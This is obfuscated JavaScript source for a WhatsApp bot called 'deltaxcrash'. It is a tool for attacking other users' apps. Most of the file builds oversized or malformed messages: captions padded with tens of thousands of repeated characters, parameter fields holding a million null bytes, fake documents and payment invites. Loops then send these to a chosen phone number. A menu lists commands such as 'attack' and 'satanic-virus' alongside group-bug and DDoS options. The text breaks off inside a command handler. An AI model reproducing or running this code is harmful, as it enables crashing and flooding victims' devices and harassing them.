const _0x571414 = _0x13eb;
(function (_0x35d07b, _0x2fc2dd) {
    const _0x1c754f = _0x13eb,
        _0x394bdc = _0x35d07b();
    while (!![]) {
        try {
            const _0x53da25 = -parseInt(_0x1c754f(0x10f)) / 0x1 + parseInt(_0x1c754f(0x249)) / 0x2 * (-parseInt(_0x1c754f(0x20e)) / 0x3) + parseInt(_0x1c754f(0x18f)) / 0x4 + parseInt(_0x1c754f(0x197)) / 0x5 + parseInt(_0x1c754f(0x165)) / 0x6 + -parseInt(_0x1c754f(0x1d9)) / 0x7 * (-parseInt(_0x1c754f(0x212)) / 0x8) + -parseInt(_0x1c754f(0x170)) / 0x9;
            if (_0x53da25 === _0x2fc2dd) break;
            else _0x394bdc['push'](_0x394bdc['shift']());
        } catch (_0x769d4c) {
            _0x394bdc['push'](_0x394bdc['shift']());
        }
    }
}(_0x14aa, 0x5afe7), require('./settings'), require('./lib/language'), require(_0x571414(0x21d)));
const {
    WA_DEFAULT_EPHEMERAL,
    getAggregateVotesInPollMessage,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    downloadContentFromMessage,
    areJidsSameUser,
    getContentType,
    useMultiFileAuthState,
    makeWASocket
} = global[_0x571414(0x22c)], fs = require('fs'), util = require('util'), chalk = require(_0x571414(0x233)), os = require('os'), axios = require(_0x571414(0x21c)), fsx = require(_0x571414(0x221)), crypto = require(_0x571414(0x21f)), ffmpeg = require(_0x571414(0x198)), speed = require(_0x571414(0x10e)), timestampp = speed(), latensi = speed() - timestampp, pino = require(_0x571414(0x148)), moment = require('moment-timezone'), {
    smsg,
    tanggal,
    getTime,
    isUrl,
    sleep,
    clockString,
    runtime,
    fetchJson,
    getBuffer,
    jsonformat,
    format,
    parseMention,
    getRandom,
    getGroupAdmins,
    generateProfilePicture
} = require(_0x571414(0x19a)), {
    JSDOM
} = require(_0x571414(0x232));
module[_0x571414(0x1ac)] = deltaxcrash = async (_0x17f1e9, _0x2ae8ee, _0x4466b4, _0x5a728b) => {
    const _0xbcef60 = _0x571414;
    try {
        var _0x8932fd = _0x2ae8ee[_0xbcef60(0x200)] === _0xbcef60(0x1e7) ? _0x2ae8ee[_0xbcef60(0x13f)][_0xbcef60(0x1e7)] : _0x2ae8ee[_0xbcef60(0x200)] == 'imageMessage' ? _0x2ae8ee[_0xbcef60(0x13f)][_0xbcef60(0x16d)][_0xbcef60(0x1c1)] : _0x2ae8ee[_0xbcef60(0x200)] == 'videoMessage' ? _0x2ae8ee[_0xbcef60(0x13f)][_0xbcef60(0x1f9)][_0xbcef60(0x1c1)] : _0x2ae8ee[_0xbcef60(0x200)] == _0xbcef60(0x1f1) ? _0x2ae8ee[_0xbcef60(0x13f)][_0xbcef60(0x1f1)][_0xbcef60(0x1b8)] : _0x2ae8ee[_0xbcef60(0x200)] == _0xbcef60(0x1b0) ? _0x2ae8ee[_0xbcef60(0x13f)][_0xbcef60(0x1b0)][_0xbcef60(0x1d6)] : _0x2ae8ee[_0xbcef60(0x200)] == _0xbcef60(0x203) ? _0x2ae8ee[_0xbcef60(0x13f)][_0xbcef60(0x203)][_0xbcef60(0x202)][_0xbcef60(0x1ba)] : _0x2ae8ee[_0xbcef60(0x200)] == _0xbcef60(0x16f) ? _0x2ae8ee[_0xbcef60(0x13f)]['templateButtonReplyMessage'][_0xbcef60(0x178)] : _0x2ae8ee['mtype'] === _0xbcef60(0x112) ? _0x2ae8ee['message'][_0xbcef60(0x1b0)]?. [_0xbcef60(0x1d6)] || _0x2ae8ee[_0xbcef60(0x13f)][_0xbcef60(0x203)]?. [_0xbcef60(0x202)][_0xbcef60(0x1ba)] || _0x2ae8ee[_0xbcef60(0x1b8)] : '',
            _0x4c5417 = typeof _0x2ae8ee[_0xbcef60(0x1b8)] == _0xbcef60(0x119) ? _0x2ae8ee[_0xbcef60(0x1b8)] : '',
            _0x82bf04 = global[_0xbcef60(0x1a4)] ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi [_0xbcef60(0x218)](_0x8932fd) ? _0x8932fd[_0xbcef60(0x15d)](/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0x0] : '' : global[_0xbcef60(0x1a4)] ?? global['prefix'];
        const _0x4db93d = JSON[_0xbcef60(0x15e)](fs[_0xbcef60(0x219)](_0xbcef60(0x1c6))),
            _0x1be7b1 = _0x8932fd['startsWith'](_0x82bf04),
            _0x3ba139 = _0x8932fd['startsWith'](_0x82bf04) ? _0x8932fd['slice'](_0x82bf04[_0xbcef60(0x12d)])[_0xbcef60(0x1a8)]()[_0xbcef60(0x11e)](' ')['shift']()[_0xbcef60(0x1ef)]() : '',
            _0x3f2986 = _0x8932fd[_0xbcef60(0x1a8)]()[_0xbcef60(0x11e)](/ +/)[_0xbcef60(0x1f0)](0x1),
            _0x4df77f = await _0x17f1e9[_0xbcef60(0x1ff)](_0x17f1e9[_0xbcef60(0x120)]['id']),
            _0x492e1a = [_0x4df77f, ..._0x4db93d][_0xbcef60(0x159)](_0x4b5731 => _0x4b5731[_0xbcef60(0x201)](/[^0-9]/g, '') + '@s.whatsapp.net')[_0xbcef60(0x13c)](_0x2ae8ee[_0xbcef60(0x152)]),
            _0x4ff88b = q = _0x3f2986[_0xbcef60(0x1c8)](' '),
            _0x4a8d7b = _0x2ae8ee[_0xbcef60(0x138)] ? _0x2ae8ee[_0xbcef60(0x138)] : _0x2ae8ee,
            _0x3f5acb = mek[_0xbcef60(0x18d)][_0xbcef60(0x1c7)],
            {
                spawn: _0x9a023f,
                exec: _0x59a72c
            } = require(_0xbcef60(0x217)),
            _0xd74c92 = _0x2ae8ee['isGroup'] ? _0x2ae8ee[_0xbcef60(0x18d)][_0xbcef60(0x14a)] ? _0x2ae8ee[_0xbcef60(0x18d)][_0xbcef60(0x14a)] : _0x2ae8ee[_0xbcef60(0x14a)] : _0x2ae8ee[_0xbcef60(0x18d)]['remoteJid'],
            _0x5287a7 = _0x2ae8ee[_0xbcef60(0x11a)] ? await _0x17f1e9[_0xbcef60(0x19f)](_0x3f5acb)[_0xbcef60(0x151)](_0x3eb989 => {}) : '',
            _0x2bdf71 = _0x2ae8ee[_0xbcef60(0x11a)] ? await _0x5287a7['participants'] : '',
            _0x2bc213 = _0x2ae8ee[_0xbcef60(0x11a)] ? await getGroupAdmins(_0x2bdf71) : '',
            _0x3946c1 = _0x2ae8ee['isGroup'] ? _0x2bc213['includes'](_0x4df77f) : ![],
            _0x21ab96 = _0x2ae8ee[_0xbcef60(0x11a)] ? _0x2bc213[_0xbcef60(0x13c)](_0x2ae8ee['sender']) : ![],
            _0x553e8f = _0x2ae8ee[_0xbcef60(0x192)] || _0xbcef60(0x229),
            _0x2c2604 = moment(Date[_0xbcef60(0x190)]())['tz'](_0xbcef60(0x1eb))[_0xbcef60(0x183)]('id')['format'](_0xbcef60(0x13d)),
            _0x5622aa = fs[_0xbcef60(0x219)]('./lib/image/deltaxcrash.jpg'),
            _0x33fb74 = (_0x4a8d7b[_0xbcef60(0x139)] || _0x4a8d7b)['mimetype'] || '',
            {
                uptotelegra: _0x55629b
            } = require(_0xbcef60(0x177)),
            {
                TelegraPh: _0x322437,
                UploadFileUgu: _0x408966,
                webp2mp4File: _0x120462,
                floNime: _0x327a77
            } = require('./lib/uploader'),
            _0x561555 = fs['readFileSync'](_0xbcef60(0x110)),
            _0x54813b = fs[_0xbcef60(0x219)](_0xbcef60(0x1e6)),
            _0x371976 = require(_0xbcef60(0x227)),
            _0x43c030 = fs['readFileSync']('./lib/image/mamak.jpg');
        if (!_0x17f1e9[_0xbcef60(0x1ae)]) {
            if (!_0x492e1a) return;
        }
        _0x3ba139 && console['log'](_0xbcef60(0x155) + _0x553e8f + ' pesan : ' + _0x3ba139 + _0xbcef60(0x1cc) + _0x2c2604);
        let _0x2ec7b7 = [_0xbcef60(0x1b7)],
            _0x5c6a4b = _0x2ec7b7[Math[_0xbcef60(0x1af)](Math[_0xbcef60(0x158)]() * _0x2ec7b7[_0xbcef60(0x12d)])];
        _0x2ae8ee[_0xbcef60(0x13f)] && _0x17f1e9[_0xbcef60(0x173)](_0x5c6a4b, _0x3f5acb);
        async function _0x1144e9() {
            const _0x5a0a7c = _0xbcef60;
            var _0x1096f1 = [_0x5a0a7c(0x242), _0x5a0a7c(0x1ab), _0x5a0a7c(0x1ea), _0x5a0a7c(0x194), _0x5a0a7c(0x18a), _0x5a0a7c(0x129)];
            let {
                key: _0x217884
            } = await _0x17f1e9[_0x5a0a7c(0x156)](_0x3f5acb, {
                'text': 'loading menu...'
            });
            for (let _0x3eec9b = 0x0; _0x3eec9b < _0x1096f1['length']; _0x3eec9b++) {
                await _0x17f1e9[_0x5a0a7c(0x156)](_0x3f5acb, {
                    'text': _0x1096f1[_0x3eec9b],
                    'edit': _0x217884
                });
            }
        }
        const _0x5edc37 = _0x26c6a4 => {
            const _0x7f17c3 = _0xbcef60;
            var _0x4b6cb9 = ['B', _0x7f17c3(0x1b6), ' MB', _0x7f17c3(0x1a9), _0x7f17c3(0x126), ' PB', _0x7f17c3(0x21b)],
                _0x5687a1 = Math['log10'](Math['abs'](_0x26c6a4)) / 0x3 | 0x0;
            if (_0x5687a1 == 0x0) return _0x26c6a4;
            var _0x4cbe3b = _0x4b6cb9[_0x5687a1],
                _0x352b3d = Math[_0x7f17c3(0x1d5)](0xa, _0x5687a1 * 0x3),
                _0xc2c70e = _0x26c6a4 / _0x352b3d,
                _0x498fef = _0xc2c70e['toFixed'](0x1) + '';
            if (/\.0$/ [_0x7f17c3(0x218)](_0x498fef)) _0x498fef = _0x498fef[_0x7f17c3(0x180)](0x0, _0x498fef['length'] - 0x2);
            return _0x498fef + _0x4cbe3b;
        };
        _0x17f1e9[_0xbcef60(0x172)] = async (_0x1a5ef0, _0x3c1d6d, _0x5ae74a, _0x1eab7f = {}) => {
            const _0x460552 = _0xbcef60;
            let _0x385b6c = generateWAMessageFromContent(_0x1a5ef0, {
                'viewOnceMessage': {
                    'message': {
                        'interactiveMessage': {
                            'body': {
                                'text': _0x1eab7f && _0x1eab7f[_0x460552(0x20c)] ? _0x1eab7f['body'] : ''
                            },
                            'footer': {
                                'text': _0x1eab7f && _0x1eab7f[_0x460552(0x160)] ? _0x1eab7f[_0x460552(0x160)] : ''
                            },
                            'nativeFlowMessage': {
                                'buttons': _0x3c1d6d,
                                'messageParamsJson': ''
                            }
                        }
                    }
                }
            }, {
                'quoted': _0x5ae74a
            });
            return await _0x17f1e9[_0x460552(0x173)]('composing', _0x1a5ef0), _0x17f1e9['relayMessage'](_0x1a5ef0, _0x385b6c[_0x460552(0x13f)], {
                'messageId': _0x385b6c[_0x460552(0x18d)]['id']
            });
        };
        const _0x75d111 = {
                'key': {
                    'participant': _0xbcef60(0x195),
                    ..._0x2ae8ee[_0xbcef60(0x1c0)] ? {
                        'remoteJid': _0xbcef60(0x145)
                    } : {}
                },
                'message': {
                    'interactiveMessage': {
                        'header': {
                            'hasMediaAttachment': !![],
                            'jpegThumbnail': _0x5622aa
                        },
                        'nativeFlowMessage': {
                            'buttons': [{
                                'name': _0xbcef60(0x1fb),
                                'buttonParamsJson': '{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍⚡👾ÐÈL†ÄÇRÄ§HVÌRÚ§╮👾⭑ ☠️⃰͜͡؜FOUND⃟👾⚡᜴ #deltaཀ͜͡👾⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}'
                            }]
                        }
                    }
                }
            },
            _0x54f1ba = {
                'key': {
                    'participant': '0@s.whatsapp.net',
                    ..._0x2ae8ee[_0xbcef60(0x1c0)] ? {
                        'remoteJid': _0xbcef60(0x145)
                    } : {}
                },
                'message': {
                    'listResponseMessage': {
                        'title': _0xbcef60(0x1fa)
                    }
                }
            };
        async function _0xc72d47(_0x209143, _0x24c700) {
            const _0x45736c = _0xbcef60;
            var _0x490fce = generateWAMessageFromContent(_0x209143, proto['Message']['fromObject']({
                'viewOnceMessage': {
                    'message': {
                        'liveLocationMessage': {
                            'degreesLatitude': 'p',
                            'degreesLongitude': 'p',
                            'caption': 'deltaxcrash' + 'ꦾ' ['repeat'](0xc350),
                            'sequenceNumber': '0',
                            'jpegThumbnail': ''
                        }
                    }
                }
            }), {
                'userJid': _0x209143,
                'quoted': _0x24c700
            });
            await _0x17f1e9[_0x45736c(0x215)](_0x209143, _0x490fce['message'], {
                'participant': {
                    'jid': _0x209143
                },
                'messageId': _0x490fce[_0x45736c(0x18d)]['id']
            });
        }
        async function _0x46407f(_0x2b6444) {
            const _0x2ef3b0 = _0xbcef60;
            let _0x528ab8 = generateWAMessageFromContent(_0x2b6444, {
                'viewOnceMessage': {
                    'message': {
                        'messageContextInfo': {
                            'deviceListMetadata': {},
                            'deviceListMetadataVersion': 0x2
                        },
                        'interactiveMessage': proto[_0x2ef3b0(0x1dd)]['InteractiveMessage']['create']({
                            'body': proto[_0x2ef3b0(0x1dd)][_0x2ef3b0(0x189)][_0x2ef3b0(0x235)]['create']({
                                'text': ''
                            }),
                            'footer': proto[_0x2ef3b0(0x1dd)]['InteractiveMessage'][_0x2ef3b0(0x224)][_0x2ef3b0(0x22b)]({
                                'text': ''
                            }),
                            'header': proto['Message'][_0x2ef3b0(0x189)][_0x2ef3b0(0x17a)]['create']({
                                'title': '',
                                'subtitle': '',
                                'hasMediaAttachment': ![]
                            }),
                            'nativeFlowMessage': proto[_0x2ef3b0(0x1dd)]['InteractiveMessage']['NativeFlowMessage'][_0x2ef3b0(0x22b)]({
                                'buttons': [{
                                    'name': 'cta_url',
                                    'buttonParamsJson': _0x2ef3b0(0x22e)
                                }],
                                'messageParamsJson': '\x00' [_0x2ef3b0(0x10d)](0x186a0)
                            })
                        })
                    }
                }
            }, {});
            _0x17f1e9['relayMessage'](_0x2b6444, _0x528ab8[_0x2ef3b0(0x13f)], {
                'messageId': _0x528ab8[_0x2ef3b0(0x18d)]['id']
            });
        }
        async function _0x58f1a4(_0x15d54d, _0x19157a) {
            const _0x106ece = _0xbcef60;
            var _0x2b14dc = generateWAMessageFromContent(_0x15d54d, proto[_0x106ece(0x1dd)]['fromObject']({
                'interactiveMessage': {
                    'header': {
                        'title': _0x106ece(0x241),
                        'hasMediaAttachment': !![],
                        ...await prepareWAMessageMedia({
                            'image': {
                                'url': _0x106ece(0x137)
                            }
                        }, {
                            'upload': _0x17f1e9[_0x106ece(0x20a)]
                        })
                    },
                    'body': {
                        'text': ''
                    },
                    'footer': {
                        'text': _0x106ece(0x12f)
                    },
                    'nativeFlowMessage': {
                        'messageParamsJson': '\x00' [_0x106ece(0x10d)](0xf4240)
                    }
                }
            }), {
                'userJid': _0x15d54d,
                'quoted': _0x19157a
            });
            await _0x17f1e9[_0x106ece(0x215)](_0x15d54d, _0x2b14dc['message'], {
                'participant': {
                    'jid': _0x15d54d
                },
                'messageId': _0x2b14dc['key']['id']
            });
        }
        async function _0xf83177(_0x55ff79, _0xce80de) {
            const _0x537c53 = _0xbcef60;
            var _0x5d7f4f = generateWAMessageFromContent(_0x55ff79, proto[_0x537c53(0x1dd)][_0x537c53(0x1c3)]({
                'documentMessage': {
                    'url': _0x537c53(0x1d0),
                    'mimetype': _0x537c53(0x1df),
                    'fileSha256': 'ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=',
                    'fileLength': _0x537c53(0x208),
                    'pageCount': 0x3b9ac9ff,
                    'mediaKey': _0x537c53(0x23f),
                    'fileName': 'deltaxcrash' + 'ྦྷ' [_0x537c53(0x10d)](0xea60),
                    'fileEncSha256': 'pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=',
                    'directPath': _0x537c53(0x1b1),
                    'mediaKeyTimestamp': _0x537c53(0x133)
                }
            }), {
                'userJid': _0x55ff79,
                'quoted': _0xce80de
            });
            await _0x17f1e9[_0x537c53(0x215)](_0x55ff79, _0x5d7f4f[_0x537c53(0x13f)], {
                'participant': {
                    'jid': _0x55ff79
                },
                'messageId': _0x5d7f4f[_0x537c53(0x18d)]['id']
            });
        }
        async function _0x1ca19d(_0xf733d1, _0x5e7421) {
            const _0x269e35 = _0xbcef60;
            var _0x20e81d = generateWAMessageFromContent(_0xf733d1, proto['Message'][_0x269e35(0x1c3)]({
                'stickerMessage': {
                    'url': 'https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true',
                    'fileSha256': _0x269e35(0x16c),
                    'fileEncSha256': _0x269e35(0x188),
                    'mediaKey': '4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=',
                    'mimetype': 'image/webp',
                    'directPath': '/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000',
                    'fileLength': _0x269e35(0x1e0),
                    'mediaKeyTimestamp': '1715876003',
                    'isAnimated': ![],
                    'stickerSentTs': _0x269e35(0x220),
                    'isAvatar': ![],
                    'isAiSticker': ![],
                    'isLottie': ![]
                }
            }), {
                'userJid': _0xf733d1,
                'quoted': _0x5e7421
            });
            await _0x17f1e9[_0x269e35(0x215)](_0xf733d1, _0x20e81d[_0x269e35(0x13f)], {
                'participant': {
                    'jid': _0xf733d1
                },
                'messageId': _0x20e81d[_0x269e35(0x18d)]['id']
            });
        }
        async function _0x19fd36(_0x19c6ea) {
            const _0xab87a9 = _0xbcef60;
            var _0x505d1a = generateWAMessageFromContent(_0x19c6ea, proto[_0xab87a9(0x1dd)][_0xab87a9(0x1c3)]({
                'listMessage': {
                    'title': _0xab87a9(0x1fa) + '\x00' [_0xab87a9(0x10d)](0xe09c0),
                    'footerText': 'àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®',
                    'description': _0xab87a9(0x1d2),
                    'buttonText': null,
                    'listType': 0x2,
                    'productListInfo': {
                        'productSections': [{
                            'title': _0xab87a9(0x117),
                            'products': [{
                                'productId': _0xab87a9(0x246)
                            }]
                        }],
                        'productListHeaderImage': {
                            'productId': _0xab87a9(0x246),
                            'jpegThumbnail': null
                        },
                        'businessOwnerJid': _0xab87a9(0x195)
                    }
                },
                'footer': _0xab87a9(0x117),
                'contextInfo': {
                    'expiration': 0x927c0,
                    'ephemeralSettingTimestamp': '1679959486',
                    'entryPointConversionSource': _0xab87a9(0x234),
                    'entryPointConversionApp': 'whatsapp',
                    'entryPointConversionDelaySeconds': 0x9,
                    'disappearingMode': {
                        'initiator': _0xab87a9(0x128)
                    }
                },
                'selectListType': 0x2,
                'product_header_info': {
                    'product_header_info_id': 0x4433e2e130,
                    'product_header_is_rejected': ![]
                }
            }), {
                'userJid': _0x19c6ea
            });
            await _0x17f1e9['relayMessage'](_0x19c6ea, _0x505d1a['message'], {
                'participant': {
                    'jid': _0x19c6ea
                },
                'messageId': _0x505d1a['key']['id']
            });
        }
        async function _0x59b068(_0x56f3f2) {
            const _0x256e0d = _0xbcef60;
            var _0x3a2368 = generateWAMessageFromContent(_0x56f3f2, proto[_0x256e0d(0x1dd)][_0x256e0d(0x1c3)]({
                'viewOnceMessage': {
                    'message': {
                        'liveLocationMessage': {
                            'degreesLatitude': 'p',
                            'degreesLongitude': 'p',
                            'caption': _0x256e0d(0x15b) + _0x256e0d(0x21e)['repeat'](0xc350),
                            'sequenceNumber': '0',
                            'jpegThumbnail': ''
                        }
                    }
                }
            }), {
                'userJid': _0x56f3f2
            });
            await _0x17f1e9[_0x256e0d(0x215)](_0x56f3f2, _0x3a2368[_0x256e0d(0x13f)], {
                'participant': {
                    'jid': _0x56f3f2
                },
                'messageId': _0x3a2368[_0x256e0d(0x18d)]['id']
            });
        }
        async function _0x342c47(_0x409d62) {
            const _0x1eea6f = _0xbcef60;
            var _0xd6b73d = generateWAMessageFromContent(_0x409d62, proto['Message'][_0x1eea6f(0x1c3)]({
                'viewOnceMessage': {
                    'message': {
                        'interactiveMessage': {
                            'header': {
                                'title': '',
                                'subtitle': ' '
                            },
                            'body': {
                                'text': _0x1eea6f(0x1fa)
                            },
                            'footer': {
                                'text': 'xp'
                            },
                            'nativeFlowMessage': {
                                'buttons': [{
                                    'name': _0x1eea6f(0x150),
                                    'buttonParamsJson': _0x1eea6f(0x1f8)
                                }],
                                'messageParamsJson': '\x00' ['repeat'](0xf4240)
                            }
                        }
                    }
                }
            }), {
                'userJid': _0x409d62
            });
            await _0x17f1e9[_0x1eea6f(0x215)](_0x409d62, _0xd6b73d[_0x1eea6f(0x13f)], {
                'participant': {
                    'jid': _0x409d62
                },
                'messageId': _0xd6b73d[_0x1eea6f(0x18d)]['id']
            });
        }
        async function _0x2aec0a(_0x13a61d) {
            const _0x551b6c = _0xbcef60;
            _0x17f1e9[_0x551b6c(0x215)](_0x13a61d, {
                'extendedTextMessage': {
                    'text': '.',
                    'contextInfo': {
                        'stanzaId': _0x13a61d,
                        'participant': _0x13a61d,
                        'quotedMessage': {
                            'conversation': _0x551b6c(0x15b) + 'ê¦¾' [_0x551b6c(0x10d)](0xc350)
                        },
                        'disappearingMode': {
                            'initiator': _0x551b6c(0x23a),
                            'trigger': _0x551b6c(0x141)
                        }
                    },
                    'inviteLinkGroupTypeV2': _0x551b6c(0x236)
                }
            }, {
                'participant': {
                    'jid': _0x13a61d
                }
            }, {
                'messageId': null
            });
        }
        async function _0x4683b4(_0x168b09, _0x3079b0) {
            for (let _0x2c48e9 = 0x0; _0x2c48e9 < _0x3079b0; _0x2c48e9++) {
                _0x19fd36(_0x168b09), await sleep(0x5dc), _0x59b068(_0x168b09), await sleep(0x7d0), _0x342c47(_0x168b09), await sleep(0x1f4), _0x342c47(_0x168b09), await sleep(0x1f4);
            }
        }
        async function _0x4c94b5(_0x4f7d01, _0x41c0ac) {
            for (let _0x5c802b = 0x0; _0x5c802b < _0x41c0ac; _0x5c802b++) {
                _0x342c47(_0x4f7d01), await sleep(0x5dc), _0x342c47(_0x4f7d01), await sleep(0x7d0), _0x342c47(_0x4f7d01), await sleep(0x1f4), _0x342c47(_0x4f7d01), await sleep(0x1f4);
            }
        }
        const _0x433d82 = {
            'key': {
                'remoteJid': _0xbcef60(0x145),
                'fromMe': ![],
                'participant': '0@s.whatsapp.net'
            },
            'message': {
                'listResponseMessage': {
                    'title': '彡deltaxcrash'
                }
            }
        };
        async function _0x38ad94(_0x24fac4) {
            const _0x19d13a = _0xbcef60;
            await _0x17f1e9[_0x19d13a(0x215)](_0x24fac4, {
                'paymentInviteMessage': {
                    'serviceType': 'FBPAY',
                    'expiryTimestamp': Date[_0x19d13a(0x190)]() + 0x6c258c00
                }
            }, {
                'participant': {
                    'jid': _0x24fac4
                }
            });
        }
        async function _0x19c29a(_0x2ea05a) {
            const _0x4a0ddb = _0xbcef60;
            var _0x5bc104 = generateWAMessageFromContent(_0x2ea05a, proto[_0x4a0ddb(0x1dd)][_0x4a0ddb(0x1c3)]({
                'viewOnceMessage': {
                    'message': {
                        'interactiveMessage': {
                            'header': {
                                'title': '',
                                'subtitle': ' '
                            },
                            'body': {
                                'text': _0x4a0ddb(0x1ce)
                            },
                            'footer': {
                                'text': _0x4a0ddb(0x1a5)
                            },
                            'nativeFlowMessage': {
                                'buttons': [{
                                    'name': _0x4a0ddb(0x150),
                                    'buttonParamsJson': '{ display_text : \'deltaxcrashBugWhatsApp\', url : , merchant_url :  }'
                                }],
                                'messageParamsJson': '\x00' [_0x4a0ddb(0x10d)](0xf4240)
                            }
                        }
                    }
                }
            }), {
                'userJid': _0x2ea05a,
                'quoted': _0x2ae8ee
            });
            await _0x17f1e9[_0x4a0ddb(0x215)](_0x2ea05a, _0x5bc104[_0x4a0ddb(0x13f)], {
                'messageId': _0x5bc104[_0x4a0ddb(0x18d)]['id']
            });
        }
        async function _0x4e0965(_0x47572f) {
            _0x38ad94(_0x47572f), sleep(0x1f4), _0x2aec0a(_0x47572f);
        }
        const _0xa0d8fd = _0x34b8a1 => {
                const _0x4c656c = _0xbcef60;
                return _0x34b8a1[Math['floor'](Math[_0x4c656c(0x158)]() * _0x34b8a1[_0x4c656c(0x12d)])];
            },
            _0x2bc9ce = _0x24ea77 => {
                const _0x1d13d4 = _0xbcef60;
                return _0x17f1e9['sendMessage'](_0x3f5acb, {
                    'text': _0x24ea77,
                    'contextInfo': {
                        'externalAdReply': {
                            'title': _0x1d13d4(0x1fa),
                            'body': 'Hai ' + _0x553e8f,
                            'previewType': 'PHOTO',
                            'thumbnail': _0x5622aa,
                            'sourceUrl': _0x1d13d4(0x14c)
                        }
                    }
                }, {
                    'quoted': _0x2ae8ee
                });
            },
            _0x3fcec2 = async _0x1dfa0a => {
                const _0x478f35 = _0xbcef60;
                try {
                    await _0x371976[_0x478f35(0x1d7)](_0x1dfa0a);
                    let _0x415660 = getRandom(_0x478f35(0x1da));
                    _0x371976(_0x1dfa0a, {
                        'filter': _0x478f35(0x1ec)
                    })[_0x478f35(0x18b)](fs[_0x478f35(0x13e)](_0x415660))['on'](_0x478f35(0x230), async () => {
                        const _0x28412f = _0x478f35;
                        await _0x17f1e9['sendMessage'](_0x2ae8ee[_0x28412f(0x1c0)], {
                            'audio': fs['readFileSync'](_0x415660),
                            'mimetype': _0x28412f(0x1f4)
                        }, {
                            'quoted': _0x2ae8ee
                        }), fs[_0x28412f(0x19e)]('./' + _0x415660);
                    });
                } catch (_0x1a34cd) {
                    _0x2ae8ee[_0x478f35(0x1c5)]('' + _0x1a34cd);
                }
            }, _0x4b3ddc = {
                'key': {
                    'participant': _0xbcef60(0x195),
                    ..._0x2ae8ee['chat'] ? {
                        'remoteJid': 'status@broadcast'
                    } : {}
                },
                'message': {
                    'listResponseMessage': {
                        'title': _0xbcef60(0x247)
                    }
                }
            };
        switch (_0x3ba139) {
        case 'menu':
            const _0x48e79e = _0xbcef60(0x122);
            _0x17f1e9[_0xbcef60(0x156)](_0x2ae8ee['chat'], {
                'image': {
                    'url': './deltaImage.jpg'
                },
                'caption': _0x48e79e
            }, {
                'quoted': _0x2ae8ee
            });
            _0x2247cd: _0xbcef60(0x132);
            break;
        case _0xbcef60(0x1a7):
            await _0x1144e9();
            const _0x15f9bc = _0xbcef60(0x1d3) + _0x82bf04 + 'attack *+628xxx*\x0a│彡 ' + _0x82bf04 + 'one-xill *+628xxx*\x0a│彡 ' + _0x82bf04 + 'two-xill *+628xxx*\x0a│彡 ' + _0x82bf04 + _0xbcef60(0x23e) + _0x82bf04 + 'fierce-attack  *+628xxx|Amount*\x0a│彡 ' + _0x82bf04 + _0xbcef60(0x113) + _0x82bf04 + _0xbcef60(0x231) + _0x82bf04 + _0xbcef60(0x176) + _0x82bf04 + _0xbcef60(0x204) + _0x82bf04 + 'satanic-xill *+628xxx|Amount*\x0a│彡 ' + _0x82bf04 + _0xbcef60(0x1fe) + _0x82bf04 + _0xbcef60(0x14f) + _0x82bf04 + 'satanic-virus *+628xxx|Amount*\x0a╘───────────────┈⳹\x0a\x0a╒─⩽ `𝗕𝗨𝗚 𝗚𝗥𝗢𝗨𝗣 𝗩𝟱 - 𝗠𝟱` ⩾\x0a│彡 ' + _0x82bf04 + _0xbcef60(0x154) + _0x82bf04 + _0xbcef60(0x167) + _0x82bf04 + _0xbcef60(0x1a2) + _0x82bf04 + _0xbcef60(0x20f) + _0x82bf04 + 'getidgrup *Link Gc*\x0a╘───────────────┈⳹\x0a\x0a╒─⩽ `𝗗𝗗𝗢𝗦 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗 𝗘𝗠𝗢𝗝𝗜 𝗩𝟱 - 𝗠𝟱` ⩾\x0a│彡 ' + _0x82bf04 + _0xbcef60(0x164) + _0x82bf04 + _0xbcef60(0x1f7);
            _0x17f1e9[_0xbcef60(0x156)](_0x2ae8ee[_0xbcef60(0x1c0)], {
                'image': {
                    'url': _0xbcef60(0x123)
                },
                'caption': _0x15f9bc
            }, {
                'quoted': _0x2ae8ee
            });
            _0x316a69: _0xbcef60(0x132);
            break;
        case _0xbcef60(0x1c9):
            if (!_0x492e1a) return _0x2ae8ee['reply'](global['nocreator']);
            if (!_0x3f2986[0x0]) return _0x2ae8ee[_0xbcef60(0x1c5)](_0xbcef60(0x1a0) + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x14b) + (_0x82bf04 + _0x3ba139) + _0xbcef60(0x11b));
            bnnd = _0x4ff88b['split']('|')[0x0]['replace'](/[^0-9]/g, '');
            let _0x31a5c4 = await _0x17f1e9['onWhatsApp'](bnnd + _0xbcef60(0x162));
